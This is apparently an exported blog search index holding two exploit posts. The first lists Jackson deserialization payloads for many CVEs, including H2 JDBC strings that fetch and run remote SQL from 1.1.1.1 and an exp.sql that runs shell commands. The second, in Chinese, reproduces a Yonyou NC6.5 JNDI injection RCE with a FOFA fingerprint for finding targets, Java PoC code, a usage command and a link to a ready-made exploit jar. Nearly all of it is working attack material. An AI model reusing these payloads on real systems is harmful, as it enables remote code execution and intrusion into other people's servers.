<h1 id="CVE-2019-17267"><a href="#CVE-2019-17267" class="headerlink" title="CVE-2019-17267"></a>CVE-2019-17267</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;net.sf.ehcache.hibernate.EhcacheJtaTransactionManagerLookup&quot;,&#123;&quot;properties&quot;: &#123;&quot;jndiName&quot;:&quot;ssiipp&quot;&#125;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-17531"><a href="#CVE-2019-17531" class="headerlink" title="CVE-2019-17531"></a>CVE-2019-17531</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.log4j.receivers.db.JNDIConnectionSource&quot;,&#123;&quot;jndiLocation&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-10672"><a href="#CVE-2020-10672" class="headerlink" title="CVE-2020-10672"></a>CVE-2020-10672</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory&quot;,&#123;&quot;tmJndiName&quot;:&quot;ssiipp&quot;, &quot;tmFromJndi&quot;:true&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-10673"><a href="#CVE-2020-10673" class="headerlink" title="CVE-2020-10673"></a>CVE-2020-10673</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;com.caucho.config.types.ResourceRef&quot;,&#123;&quot;lookupName&quot;: &quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-11111"><a href="#CVE-2020-11111" class="headerlink" title="CVE-2020-11111"></a>CVE-2020-11111</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.activemq.jms.pool.XaPooledConnectionFactory&quot;,&#123;&quot;tmJndiName&quot;:&quot;ssiipp&quot;, &quot;tmFromJndi&quot;:true&#125;]&#125;</span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.activemq.jms.pool.JcaPooledConnectionFactory&quot;,&#123;&quot;tmJndiName&quot;:&quot;ssiipp&quot;, &quot;tmFromJndi&quot;:true&#125;]&#125;</span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.activemq.pool.XaPooledConnectionFactory&quot;,&#123;&quot;tmJndiName&quot;:&quot;ssiipp&quot;, &quot;tmFromJndi&quot;:true&#125;]&#125;</span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.activemq.pool.JcaPooledConnectionFactory&quot;,&#123;&quot;tmJndiName&quot;:&quot;ssiipp&quot;, &quot;tmFromJndi&quot;:true&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-11113"><a href="#CVE-2020-11113" class="headerlink" title="CVE-2020-11113"></a>CVE-2020-11113</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.openjpa.ee.WASRegistryManagedRuntime&quot;,&#123;&quot;registryName&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-11619"><a href="#CVE-2020-11619" class="headerlink" title="CVE-2020-11619"></a>CVE-2020-11619</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.springframework.aop.config.MethodLocatingFactoryBean&quot;,&#123;&quot;targetBeanName&quot;: &quot;ssiipp&quot;,&quot;methodName&quot;:&quot;Foo&quot;,&quot;beanFactory&quot;:[&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;,&#123;&quot;shareableResources&quot;:[&quot;ssiipp&quot;]&#125;]&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.springframework.beans.factory.config.BeanReferenceFactoryBean&quot;,&#123;&quot;targetBeanName&quot;: &quot;ssiipp&quot;,&quot;beanFactory&quot;:[&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;,&#123;&quot;shareableResources&quot;:[&quot;ssiipp&quot;]&#125;]&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-11620"><a href="#CVE-2020-11620" class="headerlink" title="CVE-2020-11620"></a>CVE-2020-11620</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.commons.jelly.impl.Embedded&quot;,&#123;&quot;script&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">spel.xml</span><br><span class="line">&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot;</span><br><span class="line">xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">xsi:schemaLocation&#x3D;&quot;</span><br><span class="line">http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans</span><br><span class="line">http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans.xsd</span><br><span class="line">&quot;&gt;</span><br><span class="line">&lt;bean id&#x3D;&quot;pb&quot; class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;constructor-arg value&#x3D;&quot;calc&quot; &#x2F;&gt;</span><br><span class="line">&lt;property name&#x3D;&quot;whatever&quot; value&#x3D;&quot;#&#123; pb.start() &#125;&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;bean&gt;</span><br><span class="line">&lt;&#x2F;beans&gt;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-14060"><a href="#CVE-2020-14060" class="headerlink" title="CVE-2020-14060"></a>CVE-2020-14060</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;oadd.org.apache.xalan.lib.sql.JNDIConnectionPool&quot;,&#123;&quot;jndiPath&quot;:&quot;sip&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-14061"><a href="#CVE-2020-14061" class="headerlink" title="CVE-2020-14061"></a>CVE-2020-14061</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;oracle.jms.AQjmsQueueConnectionFactory&quot;,&quot;ssiipp&quot;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-14062"><a href="#CVE-2020-14062" class="headerlink" title="CVE-2020-14062"></a>CVE-2020-14062</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;com.sun.org.apache.xalan.internal.lib.sql.JNDIConnectionPool&quot;,&#123;&quot;jndiPath&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-14195"><a href="#CVE-2020-14195" class="headerlink" title="CVE-2020-14195"></a>CVE-2020-14195</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.jsecurity.realm.jndi.JndiRealmFactory&quot;,&#123;&quot;jndiNames&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-8840"><a href="#CVE-2020-8840" class="headerlink" title="CVE-2020-8840"></a>CVE-2020-8840</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;, &#123;&quot;AsText&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-9546"><a href="#CVE-2020-9546" class="headerlink" title="CVE-2020-9546"></a>CVE-2020-9546</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&#123;&quot;healthCheckRegistry&quot;: &quot;ssiipp&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&#123;&quot;metricRegistry&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-9547"><a href="#CVE-2020-9547" class="headerlink" title="CVE-2020-9547"></a>CVE-2020-9547</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&#123;&quot;properties&quot;: &#123;&quot;UserTransaction&quot;:&quot;ssiipp&quot;&#125;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-9548"><a href="#CVE-2020-9548" class="headerlink" title="CVE-2020-9548"></a>CVE-2020-9548</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;, &#123;&quot;healthCheckRegistry&quot;: &quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-35728"><a href="#CVE-2020-35728" class="headerlink" title="CVE-2020-35728"></a>CVE-2020-35728</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool&quot;,&#123;&quot;jndiPath&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-36179-36182"><a href="#CVE-2020-36179-36182" class="headerlink" title="CVE-2020-36179 ~ 36182"></a>CVE-2020-36179 ~ 36182</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;oadd.org.apache.commons.dbcp.cpdsadapter.DriverAdapterCPDS&quot;,&#123;&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT&#x3D;3;INIT&#x3D;RUNSCRIPT FROM &#39;http:&#x2F;&#x2F;1.1.1.1&#x2F;exp.sql&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS&quot;,&#123;&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT&#x3D;3;INIT&#x3D;RUNSCRIPT FROM &#39;http:&#x2F;&#x2F;1.1.1.1&#x2F;exp.sql&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.tomcat.dbcp.dbcp.cpdsadapter.DriverAdapterCPDS&quot;,&#123;&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT&#x3D;3;INIT&#x3D;RUNSCRIPT FROM &#39;http:&#x2F;&#x2F;1.1.1.1&#x2F;exp.sql&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.tomcat.dbcp.dbcp2.cpdsadapter.DriverAdapterCPDS&quot;,&#123;&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT&#x3D;3;INIT&#x3D;RUNSCRIPT FROM &#39;http:&#x2F;&#x2F;1.1.1.1&#x2F;exp.sql&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">exp.sql</span><br><span class="line">    CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException &#123;</span><br><span class="line">        java.util.Scanner s &#x3D; new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">        return s.hasNext() ? s.next() : &quot;&quot;;  &#125;</span><br><span class="line">    $$;</span><br><span class="line">    CALL SHELLEXEC(&#39;calc.exe&#39;)</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-36184"><a href="#CVE-2020-36184" class="headerlink" title="CVE-2020-36184"></a>CVE-2020-36184</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.tomcat.dbcp.dbcp2.datasources.PerUserPoolDataSource&quot;, &#123;&quot;dataSourceName&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<p>2021-1-15</p>
]]></content>
      <categories>
        <category>Jackson</category>
      </categories>
      <tags>
        <tag>Poc</tag>
      </tags>
  </entry>
  <entry>
    <title>用友NC6.5反序列化JNDI注入远程代码执行复现</title>
    <url>/2021/01/25/%E7%94%A8%E5%8F%8BNC6-5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96JNDI%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h1><p>用友NC6.5版本中存在JAVA反序列化远程命令执行漏洞。<a id="more"></a>2020年中的漏洞，虽然是老漏洞，但我感觉修的不多。</p>
<h1 id="指纹"><a href="#指纹" class="headerlink" title="指纹"></a>指纹</h1><p>FOFA：title=”YONYOU NC”</p>
<p>ICONHASH：1085941792</p>
<p>长得像这样，这个最近还出了一个文件上传的漏洞。</p>
<p><img src="/images/NC6.5-2.jpg" alt="NC6.5-2"></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>我是个菜菜，代码分析略</p>
<h1 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h1><p>根据<a href="https://blog.sari3l.com/posts/608d18f0/">https://blog.sari3l.com/posts/608d18f0/</a> 的poc代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import nc.bs.framework.common.NCLocator;</span><br><span class="line"></span><br><span class="line">import java.util.Properties;</span><br><span class="line"></span><br><span class="line">public class poc &#123;</span><br><span class="line"></span><br><span class="line">    public static void attack(String url, String jndipath) &#123;</span><br><span class="line">        Properties env &#x3D; new Properties();</span><br><span class="line">        if (!url.startsWith(&quot;http&quot;)) &#123;</span><br><span class="line">            url &#x3D; &quot;http:&#x2F;&#x2F;&quot; + url;</span><br><span class="line">        &#125;</span><br><span class="line">        env.put(&quot;SERVICEDISPATCH_URL&quot;, url + &quot;&#x2F;ServiceDispatcherServlet&quot;);</span><br><span class="line">        NCLocator locator &#x3D; NCLocator.getInstance(env);</span><br><span class="line">        locator.lookup(jndipath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        attack(&quot;http:&#x2F;&#x2F;target&quot;, &quot;ldap:&#x2F;&#x2F;ip:port&#x2F;classname&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>生成了一个简单jar利用工具，效果看图。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar NC.jar 目标系统URL LDAP&#x2F;RMI服务地址</span><br></pre></td></tr></table></figure>
<p><img src="/images/NC6.5.jpg" alt="NC6.5"></p>
<p><img src="/images/NC6.5-1.jpg" alt="NC6.5-1"></p>
<p>工具下载地址：</p>
<p><a href="https://zxc12609.github.io/dL/NC6.5_JDNI_RCE.jar">点我下载</a></p>
]]></content>
      <categories>
        <category>用友</category>
      </categories>
      <tags>
        <tag>Poc</tag>
      </tags>
  </entry>
</search>
